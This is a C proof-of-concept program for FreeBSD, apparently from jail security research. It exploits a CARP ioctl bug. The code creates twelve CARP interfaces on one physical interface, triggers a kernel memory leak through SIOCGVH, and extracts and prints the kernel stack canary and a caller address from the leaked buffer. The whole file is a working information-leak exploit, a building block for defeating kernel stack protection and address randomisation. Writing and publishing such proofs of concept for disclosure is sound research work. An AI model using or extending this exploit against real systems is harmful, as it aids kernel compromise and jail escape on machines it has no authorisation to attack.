#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip_carp.h>

#define NUM_CARP_IFS 12
#define IF_NAME "epair100b"

/*
Prerequisites
-------------
1. Host must have carp kernel module loaded

sysrc kld_list+="carp"
kldload carp
*/

int main(void) {
    int sock;
    struct carpreq carpr_set;
    struct carpreq carpr_get[NUM_CARP_IFS];
    struct ifreq ifr_set;
    struct ifreq ifr_get;

    bzero(&carpr_set, sizeof(struct carpreq));
    bzero(carpr_get, sizeof(carpr_get));

    ifr_get.ifr_data = (caddr_t)&carpr_get;
    ifr_set.ifr_data = (caddr_t)&carpr_set;

    carpr_get[0].carpr_vhid = 0; // Instruct kernel we want info on all carp interfaces
    carpr_get[0].carpr_count = NUM_CARP_IFS;

    strlcpy(ifr_get.ifr_name, IF_NAME, sizeof(ifr_get.ifr_name));
    strlcpy(ifr_set.ifr_name, IF_NAME, sizeof(ifr_set.ifr_name));

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    // Create some carp interfaces.
    // We need more than one carp interface defined on one physical interface to force the kernel to trigger the
    // implementation bug that causes the memory leak.
    // See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
    //
    // NOTE(m): Defining multiple carp interfaces on one physical interface does not seem possible using `ifconfig(8)`,
    // either by design or because of a subtle locking bug (see
    // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
    for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
        carpr_set.carpr_vhid = i;
        if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
            perror("ioctl");
            exit(1);
        }
    }

    // Enumerate the carp interfaces...
    // and leak some kernel memory while we're at it
    if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
        perror("ioctl");
        exit(1);
    }

    // Extract the interesting bits from the leaked kernel memory
    const unsigned char *base = (const unsigned char *)carpr_get;  // start of the buffer
    uint64_t stack_cookie, caller_addr;

    size_t offset_stack_cookie = sizeof(struct carpreq);  // start of carpr_get[1]
    size_t offset_caller_addr  = sizeof(struct carpreq) * 2 + 16;  // 16 bytes into carpr_get[2]

    memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
    memcpy(&caller_addr, base + offset_caller_addr, sizeof(caller_addr));

    printf("\nSTACK COOKIE / CANARY:  0x%016" PRIx64 "\n", stack_cookie);
    printf("\nCALLER ADDRESS: 0x%016" PRIx64 "\n\n", caller_addr);

    close(sock);
    return 0;
}
